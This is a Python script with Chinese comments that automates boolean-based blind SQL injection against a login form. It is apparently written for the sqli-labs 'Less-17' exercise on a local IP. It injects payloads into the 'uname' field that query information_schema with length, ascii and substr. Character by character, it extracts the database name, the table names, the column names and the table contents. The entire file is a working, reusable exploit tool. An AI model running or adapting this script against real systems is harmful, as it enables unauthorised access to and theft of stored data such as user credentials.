# coding:utf-8
import requests
import argparse

#获取数据库名函数
def GetDBName(url,data1,data2,filter,isIn=True):
    print("[-] 开始获取数据库的长度")
    DBNameLen = 0

    #用for循环遍历请求，得到数据库名的长度
    str1 = data1['uname']
    for DBNameLen in range(1,99):
        #对payload的中的参数进行赋值猜解
        data1['uname'] = data1['uname'].format(DBNameLen)
        res = requests.post(url=url,data=data1)
        #判断flag是否在返回的页面中
        if isIn:
            if filter in res.text:
                print("[+] 数据库名的长度：" + str(DBNameLen))
                data1['uname'] = str1
                break
        else:
            if filter not in res.text:
                print("[+] 数据库名的长度：" + str(DBNameLen))
                data1['uname'] = str1
                break
        data1['uname'] = str1


    print("[-] 开始获取数据库名")

    # 数据库名DBName
    DBName = ''

    str2 = data2['uname']
    #a表示substr()函数的截取位置
    for a in range(1,DBNameLen+1):
        #b表示在ascii码中33～126 位可显示的字符
        for b in range(33,127):
            data2['uname'] = data2['uname'].format(a,b)
            res = requests.post(url=url,data=data2)
            if isIn:
                if filter in res.text:
                    DBName += chr(b)
                    print("[-]" + DBName)
                    data2['uname'] = str2
                    break
            else:
                if filter not in res.text:
                    DBName += chr(b)
                    print("[-]" + DBName)
                    data2['uname'] = str2
                    break
            data2['uname'] = str2


    return DBName

#获取数据库表函数
def GetDBTables(url, dbname,data1,data2,data3,filter,isIn=True):
    DBTables = []
    #存放数据库表数量的变量
    DBTableCount = 0
    print("[-] 开始获取 {} 数据库表数量：".format(dbname))
    #开始遍历获取数据库表的数量
    str1 = data1['uname']
    for DBTableCount in range(1,99):
        data1['uname'] = data1['uname'].format(dbname,DBTableCount)
        res = requests.post(url=url,data=data1)
        if isIn:
            if filter in res.text:
                print("[+]{}数据库中表的数量为：{}".format(dbname, DBTableCount))
                data1['uname'] = str1
                break
        else:
            if filter not in res.text:
                print("[+]{}数据库中表的数量为：{}".format(dbname, DBTableCount))
                data1['uname'] = str1
                break
        data1['uname'] = str1
    print("[-]开始获取{}数据库的表".format(dbname))
    #遍历表名时临时存放表名长度的变量
    tableLen = 0
    #a表示当前正在获取表的索引
    str2 = data2['uname']
    for a in range(0,DBTableCount):
        print("[-]正在获取第{}个表名".format(a+1))
        #先获取当前表名的长度
        for tableLen in range(1,99):
            data2['uname'] = data2['uname'].format(dbname,a,tableLen)
            res = requests.post(url=url,data=data2)
            if isIn:
                if filter in res.text:
                    data2['uname'] = str2
                    break
            else:
                if filter not in res.text:
                    data2['uname'] = str2
                    break
            data2['uname'] = str2

        #开始获取表名
        #临时存放当前表名的变量
        table = ""
        #b表示当前表名猜解的位置（substr）
        str3 = data3['uname']
        for b in range(1,tableLen+1):
            # c 表示在ascii码中33～126位可显示字符
            for c in range(33,127):
                data3['uname'] = data3['uname'].format(dbname,a,b,c)
                res = requests.post(url=url,data=data3)
                if isIn:
                    if filter in res.text:
                        table += chr(c)
                        print(table)
                        data3['uname'] = str3
                        break
                else:
                    if filter not in res.text:
                        table += chr(c)
                        print(table)
                        data3['uname'] = str3
                        break
                data3['uname'] = str3
        #把获取到的表名加入DBTables
        DBTables.append(table)

    return DBTables

#获取数据库表字段的函数
def GetDBColumns(url,dbname,dbtable,data1,data2,data3,filter,isIn=True):
    DBColumns = []
    #存放字段数量的变量
    DBColumnCount = 0
    print("[-] 开始获取{0}数据表的字段数：".format(dbtable))
    str1 = data1['uname']
    for DBColumnCount in range(99):
        data1['uname'] = data1['uname'].format(dbname,dbtable,DBColumnCount)
        res = requests.post(url=url,data=data1)
        if isIn:
            if filter in res.text:
                print("[-]{} 数据表的字段数为：{}".format(dbtable, DBColumnCount))
                data1['uname'] = str1
                break
        else:
            if filter not in res.text:
                print("[-]{} 数据表的字段数为：{}".format(dbtable, DBColumnCount))
                data1['uname'] = str1
                break
        data1['uname'] = str1

     #开始获取字段的名称
     #保存字段名的临时变量
    column = ""
    columnLen = 0
    # a 表示当前获取字段的索引
    str2 = data2['uname']
    for a in range(0,DBColumnCount):
        print("[-]正在获取第{} 个字段名".format(a+1))
        #先获取字段的长度
        for columnLen in range(99):
            data2['uname'] = data2['uname'].format(dbname,dbtable,a,columnLen)
            res = requests.post(url=url,data=data2)
            if isIn:
                if filter in res.text:
                    data2['uname'] = str2
                    break
            else:
                if filter not in res.text:
                    data2['uname'] = str2
                    break
            data2['uname'] = str2

        #b表示当前字段名猜解的位置
        str3 = data3['uname']
        for b in range(1,columnLen+1):
                #c 表示在ascii表的33～126位可显示字符
                for c in range(33,127):
                    data3['uname'] = data3['uname'].format(dbname,dbtable,a,b,c)
                    res = requests.post(url=url,data=data3)
                    if isIn:
                        if filter in res.text:
                            column += chr(c)
                            print(column)
                            data3['uname'] = str3
                            break
                    else:
                        if filter not in res.text:
                            column += chr(c)
                            print(column)
                            data3['uname'] = str3
                            break
                    data3['uname'] = str3

                #把获取到的字段加入DBCloumns
        DBColumns.append(column)
        #清空column，用来继续获取下一个字段名
        column = ""

    return DBColumns

#获取表字段的函数
def GetDBData(url,dbtable,dbcolumn,data1,data2,data3,filter,isIn=True):
    DBData = {}
    #先获取字段的数据数量
    DBDataCount = 0
    print("[-]开始获取 {} 表 {} 字段的数据数量".format(dbtable,dbcolumn))
    str1 = data1['uname']
    for DBDataCount in range(99):
        data1['uname'] =  data1['uname'].format(dbcolumn,dbtable,DBDataCount)
        res = requests.post(url=url,data=data1)
        if isIn:
            if filter in res.text:
                print("[-]{0}表{1}字段的数据数量为：{2}".format(dbtable, dbcolumn, DBDataCount))
                data1['uname'] = str1
                break
        else:
            if filter not in res.text:
                print("[-]{0}表{1}字段的数据数量为：{2}".format(dbtable, dbcolumn, DBDataCount))
                data1['uname'] = str1
                break
        data1['uname'] = str1

    str2 = data2['uname']
    for a in range(0,DBDataCount):
        print("[-] 正在获取{} 的 第{} 个数据".format(dbcolumn,a+1))
        #先获取这个数据的长度
        dataLen = 0
        for dataLen in range(99):
            data2['uname'] = data2['uname'].format(dbcolumn,dbtable,a,dataLen)
            res = requests.post(url=url,data=data2)
            if isIn:
                if filter in res.text:
                    print("[-]第{}个数据长度为：{}".format(a + 1, dataLen))
                    data2['uname'] = str2
                    break
            else:
                if filter not in res.text:
                    print("[-]第{}个数据长度为：{}".format(a + 1, dataLen))
                    data2['uname'] = str2
                    break
            data2['uname'] = str2

        #临时存放数据内容变量
        data = ""
        #开始获取数据具体内容
        #b表示当前数据内容的猜解的位置
        str3 = data3['uname']
        for b in range(1,dataLen+1):
            for c in range(33,127):
                data3['uname'] = data3['uname'].format(dbcolumn,dbtable,a,b,c)
                res = requests.post(url=url,data=data3)
                if isIn:
                    if filter in res.text:
                        data += chr(c)
                        print(data)
                        data3['uname'] = str3
                        break
                else:
                    if filter not in res.text:
                        data += chr(c)
                        print(data)
                        data3['uname'] = str3
                        break
                data3['uname'] = str3

        #放到以字段名为健，值为列表的字典中
        DBData.setdefault(dbcolumn,[]).append(data)

    return DBData

#入口，主函数
#盲注主函数
def StartSqli(url,filter,isIn,prefix=''):
    data1 = {
        'uname': prefix + "length(database())={}#",
        'passwd': ''
    }
    data2 = {
        'uname': prefix + "ascii(substr(database(),{},1))={}#",
        'passwd': ''
    }
    data3 = {
        'uname': prefix + "(select count(*)table_name from information_schema.tables where table_schema='{}')={}#",
        'passwd': ''
    }
    data4 = {
        'uname': prefix + "(select LENGTH(table_name) from information_schema.tables where table_schema='{}' limit {},1)={}#",
        'passwd': ''
    }
    data5 = {
        'uname': prefix + "ascii(substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1))={}#",
        'passwd': ''
    }
    data6 = {
        'uname': prefix + "(select count(column_name) from information_schema.columns where table_schema='{}' and table_name='{}')={}#",
        'passwd': ''
    }
    data7 = {
        'uname': prefix + "(select length(column_name) from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1)={}#",
        'passwd': ''
    }
    data8 = {
        'uname': prefix + "ascii(substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1),{},1))={}#",
        'passwd': ''
    }
    data9 = {
        'uname': prefix + "(select count({}) from {})={}#",
        'passwd': ''
    }
    data10 = {
        'uname': prefix + "(select length({}) from {} limit {},1)={}#",
        'passwd': ''
    }
    data11 = {
        'uname': prefix + "ascii(substr((select {} from {} limit {},1),{},1))={}#",
        'passwd': ''
    }  

    datas = [data1, data2, data3, data4, data5, data6,
                data7, data8, data9, data10,data11]

    DBName = GetDBName(url,datas[0],datas[1],filter,isIn)
    print("[+]当前数据库名：{}".format(DBName))
    DBTables = GetDBTables(url,DBName,datas[2],datas[3],datas[4],filter,isIn)
    print("[+] 数据库 {} 的表如下：".format(DBName))
    for item in range(len(DBTables)):
        print("(" + str(item + 1 ) + ")" + DBTables[item])
    tableIndex = int(input("[*] 请输入要查看的表的序号 :")) - 1
    DBColumns = GetDBColumns(url,DBName,DBTables[tableIndex],datas[5],datas[6],datas[7],filter,isIn)
    while True:
        print("[+] 数据表 {} 的字段如下:".format(DBTables[tableIndex]))
        for item in range(len(DBColumns)):
            print("(" + str(item + 1) + ")" + DBColumns[item])
        columnIndex = int(input("[*] 请输入 要查看的字段的序号(输入0退出):")) - 1
        if(columnIndex == -1):
            break
        else:
            getdbData = GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex],datas[8],datas[9],datas[10],filter,isIn)
            print(getdbData)

if __name__ == '__main__':

    url = "http://192.168.88.136:5569/Less-17/"
    filter = '<font color= "#FFFF00" font size = 4>'
    isIn = True
    prefix= "' and "
    StartSqli(url,filter,isIn,prefix)

